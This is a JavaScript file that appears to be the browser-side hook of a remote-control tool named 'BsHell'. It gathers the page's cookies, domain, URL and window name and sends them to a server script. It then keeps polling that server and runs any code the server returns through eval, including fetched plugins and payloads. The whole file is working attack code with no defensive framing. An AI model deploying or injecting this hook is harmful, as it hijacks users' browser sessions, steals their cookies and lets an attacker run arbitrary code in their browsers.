
if(typeof JSON == "undefined") {
    window.JSON = {
	stringify: function (obj) {
	    var t = typeof (obj);
	    if (t != "object" || obj === null) {
		// simple data type
		if (t == "string") obj = '"'+obj+'"';
		return String(obj);
	    }
	    else {
		// recurse array or object
		var n, v, json = [], arr = (obj && obj.constructor == Array);
		for (n in obj) {
		    v = obj[n]; t = typeof(v);
		    if (t == "string") v = '"'+v+'"';
		    else if (t == "object" && v !== null) v = JSON.stringify(v);
		    json.push((arr ? "" : '"' + n + '":') + String(v));
		}
		return (arr ? "[" : "{") + String(json) + (arr ? "]" : "}");
	    }
	},

	parse: function (str) {
	    if (str === "") str = '""';
	    eval("var p=" + str + ";");
	    return p;
	}
    };
}

(function(options) {
    var self = this;
    
    self.url = "bshell.php";
    if(options.url)
	self.url=options.url;
    self.options = options;

    self.plugins = {};
    self.timer = false;
    self.stopped = false;
    self.sessionId = false;

    this.parseResponse = function(txt) {
	var msg;
	try {
	    eval("msg = " + txt);
	} catch(e) {
	    self.log("Exception for ''msg = " + txt + "'': " + e.message);
	    msg = {error: e.message};
	}
	return msg;
    };
    
    this.get_xhr = function()
    {
	try { return new XMLHttpRequest(); } catch(e) {}
	try { return new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) {}
	self.log("XMLHttpRequest not supported");
	return null;
    };

    this.begin_xhr = function(method, url, callback) {
	var xhr = self.get_xhr();
	xhr.open(method, url);
	xhr.onreadystatechange = function(evt) {
	    if(xhr.readyState == 4) {
		if(xhr.status == 200) {
		    setTimeout(function() {callback(xhr.responseText)}, 10);
	        } else {
		    setTimeout(function() {callback({error: "Status " + xhr.status + " for " + url})}, 10);;
		}
	    }
	}
	return xhr;
    };
    
    this.req = function(url, data, callback) {
	var packet = data || {};
	if(self.sessionId)
	    packet.sessionId = self.sessionId;
	if(typeof data == "object")
	    for(var k in data)
		packet[k] = data[k];
	
	self.http_req(self.options.requestMethod,
		      url,
		      packet, 
		      callback,
		      self.options.requestHeader);
    };

    this.http_req = function(method, url,packet,callback,header_name)
    {
	if(method.toLowerCase() == "get" && typeof header_name == "undefined")
	    url = url + "?req=" + encodeURIComponent(JSON.stringify(packet));
	var xhr = self.begin_xhr(method, url, callback);
	if(typeof header_name != "undefined")
	    xhr.setRequestHeader(header_name, escape(JSON.stringify(packet)));
	if(method.toLowerCase() == "post") {
	    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	    if(typeof header_name == "undefined") {
		xhr.send("req=" + escape(JSON.stringify(packet)));
		return;
	    }
	}
	xhr.send(null);
    }
    
    this.resumeSession = function() {
	var cook = self.readCookie("BsHell");
	if(cook) {
	    self.sessionId = cook;
	    self.log("resumed session from cookie:" + self.sessionId);
	    return true;
	}
	return false;
    };
    
    this.readCookie = function(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
	    var c = ca[i];
	    while (c.charAt(0)==' ') c = c.substring(1,c.length);
	    if (c.indexOf(nameEQ) == 0) 
		return c.substring(nameEQ.length,c.length);
	}
	return false;
    }
    
    this.stop = function() {
	if(self.timer)
	    clearTimeout(self.timer);
	self.send({cmd: "stop"});
	self.timer = false;
	self.stopped = true;
	self.log("STOPPED!");
    }
    
    this.start = function() {
	self.log("starting BsHell");
	var packet = {
	    domain: document.domain,
	    page: document.location.href
	}
	if(window.name)
	    packet.window_name = window.name;
	if(document.cookie)
	    packet.cookies = document.cookie;
	packet.cmd = this.resumeSession() ? "resume" : "start";
	self.trigger(packet);
    };
    
    this.trigger = function(data) {
	if(self.timer != false)
	    clearTimeout(self.timer);
	self.timer = setTimeout(function() {
	    self.send(data);
	}, (data != false && data.cmd) ? 1 : 5000);
    };

    this.registerPlugin = function(name, plugin) {
	self.plugins[name] = plugin;
    };

    this.requirePlugin = function(name, orig) {
	if(typeof self.plugins[name] != "undefined") {
	    return true;
	}
	self.log("requires unloaded plugin, requesting plugin " + name);
	setTimeout(function() {
	    self.req(self.url,
		     {cmd: "plugin", name: name}, 
		     function(text) {
			 self.receive(text, function(ret) {
			     if(typeof self.plugins[name] == "undefined") 
				 self.send({cmd: "result", error: "required plugin not found: " + name});
			     else if(typeof orig == "string")
				 self.receive(orig);// run original code again
			 });
		     });
	}, 10);
	return false;
    };

    this.receive = function(text, callback) {
	var msg = self.parseResponse(text);
	var trigger = self.trigger;
	if(self.stopped) {
	    trigger = function() {};
	}

	if(msg.error) {
	    self.log("failed to parse message: " + text);
	    trigger(false);
	    return;
	}
	self.log("received msg", msg)

	if(msg.sessionId && (!self.sessionId || self.sessionId != msg.sessionId))
	    self.sessionId = msg.sessionId;
	if(msg.code) {
	    var cod = msg.code;
	    var cmdId = msg.id;
	    setTimeout(function() { 
		var ret={}, res = false;
		try {
		    var bshell = {
			plugins: self.plugins,
			send: function(data) {
			    setTimeout(function() {self.send({cmd: "result", id: cmdId, response: data});},10);
			},
			stop: function() {
			    self.stop();
			},
			register_plugin: function(name, plugin) {
			    self.registerPlugin(name, new plugin(self));
			    this.plugins = self.plugins;
			},
			require_plugin: function(name) {
			    return self.requirePlugin(name, text);
			},
			run_payload: function(name) {
			    setTimeout(function() {self.send({cmd: "payload", name: name, requester: cmdId});},10);
			}
		    };
		    eval("res = " + cod);
		    ret.response = res;
		} catch(e) {
		    ret={error: e.message};
		}
		
		if(ret.response != false && typeof ret.response != "undefined") {
		    ret.id = cmdId;
		    ret.cmd = "result";
		    self.trigger(ret); // intentional self.trigger!
		} else {
		    trigger(false);
		}
		if(typeof callback != "undefined")
		    callback(ret);
	    }, 1);
	}
	else
	    trigger(false);
    };
    
    this.send = function(data) {
	self.req(self.url, data, self.receive);
	self.log("sent data", data);
    };
    
    this.log = function(str, obj) {
	//uncomment to disable logging to the browser console
	//return;
	if(typeof obj != "undefined")
	    str += " => " + JSON.stringify(obj);
	console.log("LOG: " + str);
    };
    this.start();
}({url:'bshell.php', requestMethod:'post'/*, requestHeader: 'Accept-Language'*/}));
